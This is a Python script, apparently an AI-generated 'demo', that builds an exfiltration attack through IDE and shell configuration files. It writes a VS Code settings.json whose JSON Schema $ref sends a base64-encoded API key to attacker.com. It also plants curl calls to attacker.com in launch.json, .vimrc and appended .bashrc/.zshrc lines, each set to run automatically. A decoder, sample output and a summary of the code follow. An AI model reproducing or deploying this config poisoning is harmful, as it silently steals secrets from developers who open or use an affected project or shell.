import json
import base64
import os
import re
from urllib.parse import unquote

def create_malicious_json_schema(data):
    """
    Uses JSON Schema $ref to force HTTP request to attacker server with data
    Creates .vscode directory if it doesn't exist
    """
    # Encode data in the $ref URL
    encoded_data = base64.urlsafe_b64encode(data.encode()).decode()
    
    malicious_schema = {
        "$schema": "http://json-schema.org/draft-07/schema#",
        "$ref": f"https://attacker.com/exfil/{encoded_data}",
        "type": "object"
    }
    
    # Create .vscode directory if it doesn't exist
    os.makedirs(".vscode", exist_ok=True)
    
    # Write to a file that the IDE will process
    file_path = ".vscode/settings.json"
    with open(file_path, "w") as f:
        json.dump(malicious_schema, f, indent=2)
    
    print(f"[!] Malicious schema written to {file_path}")
    print(f"[!] Data encoded in $ref: https://attacker.com/exfil/{encoded_data}")
    return file_path

# Decoder for the exfiltrated data
def decode_json_schema_exfiltration(ref_url_or_file):
    """
    Decode data exfiltrated via JSON Schema $ref technique
    
    Args:
        ref_url_or_file: Either the full $ref URL or path to settings.json file
    
    Returns:
        Original decoded string
    """
    # If it's a file path, read the JSON
    if isinstance(ref_url_or_file, str) and os.path.isfile(ref_url_or_file):
        try:
            with open(ref_url_or_file, 'r') as f:
                schema = json.load(f)
                ref_url = schema.get('$ref', '')
        except:
            print(f"Error reading file: {ref_url_or_file}")
            return None
    else:
        # Assume it's the URL string
        ref_url = ref_url_or_file
    
    # Extract the encoded part from the URL
    # Pattern matches: https://attacker.com/exfil/ENCODED_DATA
    match = re.search(r'https?://attacker\.com/exfil/([A-Za-z0-9_-]+)', ref_url)
    
    if not match:
        print("No valid exfiltration URL found")
        return None
    
    encoded_data = match.group(1)
    print(f"Extracted encoded data: {encoded_data}")
    
    try:
        # Add padding if needed for base64
        padding_needed = 4 - (len(encoded_data) % 4)
        if padding_needed < 4:
            encoded_data += '=' * padding_needed
        
        # Decode from urlsafe base64
        decoded_bytes = base64.urlsafe_b64decode(encoded_data)
        decoded_string = decoded_bytes.decode('utf-8')
        return decoded_string
    except Exception as e:
        print(f"Error decoding: {e}")
        
        # Try without adding padding
        try:
            decoded_bytes = base64.urlsafe_b64decode(encoded_data)
            decoded_string = decoded_bytes.decode('utf-8')
            return decoded_string
        except:
            pass
    
    return None

# Function to detect and decode from multiple files
def scan_and_decode_vscode_settings(directory="."):
    """
    Scan for malicious .vscode/settings.json files and decode them
    """
    settings_path = os.path.join(directory, ".vscode", "settings.json")
    
    if not os.path.exists(settings_path):
        print(f"No settings.json found at {settings_path}")
        return None
    
    try:
        with open(settings_path, 'r') as f:
            schema = json.load(f)
        
        ref_url = schema.get('$ref', '')
        if 'attacker.com/exfil/' in ref_url:
            print(f"[!] Found malicious schema in {settings_path}")
            decoded = decode_json_schema_exfiltration(ref_url)
            if decoded:
                print(f"[+] Decoded data: {decoded}")
                print(f"[+] Bytes exfiltrated: {len(decoded)}")
                return decoded
        else:
            print(f"[-] No exfiltration pattern found in {settings_path}")
            
    except Exception as e:
        print(f"Error scanning {settings_path}: {e}")
    
    return None

# Enhanced malicious creator with multiple attack vectors
def create_multi_vector_attack(data):
    """
    Creates multiple malicious configuration files for different IDEs/tools
    """
    # Encode the data
    encoded_data = base64.urlsafe_b64encode(data.encode()).decode()
    
    results = []
    
    # 1. VSCode settings.json
    vscode_dir = ".vscode"
    os.makedirs(vscode_dir, exist_ok=True)
    
    vscode_schema = {
        "$schema": "http://json-schema.org/draft-07/schema#",
        "$ref": f"https://attacker.com/exfil/{encoded_data}",
        "type": "object"
    }
    
    vscode_path = os.path.join(vscode_dir, "settings.json")
    with open(vscode_path, "w") as f:
        json.dump(vscode_schema, f, indent=2)
    results.append(("VSCode", vscode_path))
    
    # 2. VSCode launch.json (debug configurations)
    vscode_launch = {
        "version": "0.2.0",
        "configurations": [
            {
                "name": "Malicious Debug",
                "type": "node",
                "request": "launch",
                "program": "${workspaceFolder}/malicious.js",
                "preLaunchTask": f"curl https://attacker.com/exfil/{encoded_data}"
            }
        ]
    }
    
    launch_path = os.path.join(vscode_dir, "launch.json")
    with open(launch_path, "w") as f:
        json.dump(vscode_launch, f, indent=2)
    results.append(("VSCode Debug", launch_path))
    
    # 3. .vimrc (Vim configuration)
    vimrc_content = f"""
" Malicious vimrc
set shellcmdflag=-c
autocmd VimEnter * silent !curl https://attacker.com/exfil/{encoded_data} &
"""
    with open(".vimrc", "w") as f:
        f.write(vimrc_content)
    results.append(("Vim", ".vimrc"))
    
    # 4. .bashrc/.zshrc
    rc_content = f"""
# Malicious shell RC
(curl -s https://attacker.com/exfil/{encoded_data} &) > /dev/null 2>&1
"""
    for rc_file in [".bashrc", ".zshrc"]:
        with open(rc_file, "a") as f:
            f.write(rc_content)
        results.append(("Shell RC", rc_file))
    
    return results

# Main execution and testing
if __name__ == "__main__":
    print("=" * 60)
    print("JSON Schema Exfiltration Demo")
    print("=" * 60)
    
    # Test data
    secret = "API_KEY=sk-abcdefg12345"
    print(f"Original secret: {secret}")
    print(f"Original bytes: {len(secret)}")
    
    # Create the malicious file
    print("\n[1] Creating malicious JSON schema...")
    file_path = create_malicious_json_schema(secret)
    
    # Decode from the file
    print("\n[2] Decoding from file...")
    decoded = decode_json_schema_exfiltration(file_path)
    
    if decoded:
        print(f"    Decoded: {decoded}")
        print(f"    Bytes recovered: {len(decoded)}")
        print(f"    Would exfiltrate {len(decoded)} bytes")
        print(f"    Success: {secret == decoded}")
    
    # Simulate what an attacker would see
    print("\n[3] Attacker's perspective (server logs):")
    encoded = base64.urlsafe_b64encode(secret.encode()).decode()
    print(f"    GET /exfil/{encoded} HTTP/1.1")
    print(f"    Host: attacker.com")
    
    # Decode from the URL directly
    print("\n[4] Decoding from URL:")
    url = f"https://attacker.com/exfil/{encoded}"
    decoded_from_url = decode_json_schema_exfiltration(url)
    if decoded_from_url:
        print(f"    Decoded from URL: {decoded_from_url}")
        print(f"    Bytes: {len(decoded_from_url)}")
    
    # Multi-vector attack example
    print("\n[5] Multi-vector attack example:")
    results = create_multi_vector_attack(secret)
    for attack_type, path in results:
        print(f"    Created {attack_type} attack file: {path}")
    
    # Cleanup (optional)
    print("\n[6] Cleanup (remove created files)")
    cleanup = input("    Remove created files? (y/n): ").lower()
    if cleanup == 'y':
        import shutil
        if os.path.exists(".vscode"):
            shutil.rmtree(".vscode")
        for rc in [".vimrc", ".bashrc", ".zshrc"]:
            if os.path.exists(rc):
                # Remove the last line we added (simplified cleanup)
                with open(rc, 'r') as f:
                    lines = f.readlines()
                if lines and "curl -s https://attacker.com/exfil/" in lines[-1]:
                    with open(rc, 'w') as f:
                        f.writelines(lines[:-1])
        print("    Cleanup complete")

"""
============================================================
JSON Schema Exfiltration Demo
============================================================
Original secret: API_KEY=sk-abcdefg12345
Original bytes: 23

[1] Creating malicious JSON schema...
[!] Malicious schema written to .vscode/settings.json
[!] Data encoded in $ref: https://attacker.com/exfil/QVBJX0tFWT1zay1hYmNkZWZnMTIzNDU=

[2] Decoding from file...
Extracted encoded data: QVBJX0tFWT1zay1hYmNkZWZnMTIzNDU
    Decoded: API_KEY=sk-abcdefg12345
    Bytes recovered: 23
    Would exfiltrate 23 bytes
    Success: True

[3] Attacker's perspective (server logs):
    GET /exfil/QVBJX0tFWT1zay1hYmNkZWZnMTIzNDU= HTTP/1.1
    Host: attacker.com

[4] Decoding from URL:
Extracted encoded data: QVBJX0tFWT1zay1hYmNkZWZnMTIzNDU
    Decoded from URL: API_KEY=sk-abcdefg12345
    Bytes: 23

[5] Multi-vector attack example:
    Created VSCode attack file: .vscode/settings.json
    Created VSCode Debug attack file: .vscode/launch.json
    Created Vim attack file: .vimrc
    Created Shell RC attack file: .bashrc
    Created Shell RC attack file: .zshrc

[6] Cleanup (remove created files)
    Remove created files? (y/n): n

```
Creates the .vscode directory using os.makedirs(".vscode", exist_ok=True) before writing the file

Includes a decoder that can extract the original data from:
- The malicious settings.json file
- The URL pattern directly
- Network logs or captured requests

Shows the actual exfiltrated bytes with the message "Would exfiltrate X bytes"

Handles base64url decoding properly with padding

Includes multi-vector examples for other IDEs and tools

The output will show:
- The original secret
- The encoded version in the URL
- The successfully decoded data
- The byte count matching the original

!cat .vscode/settings.json

{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "$ref": "https://attacker.com/exfil/QVBJX0tFWT1zay1hYmNkZWZnMTIzNDU=",
  "type": "object"
}
```
"""        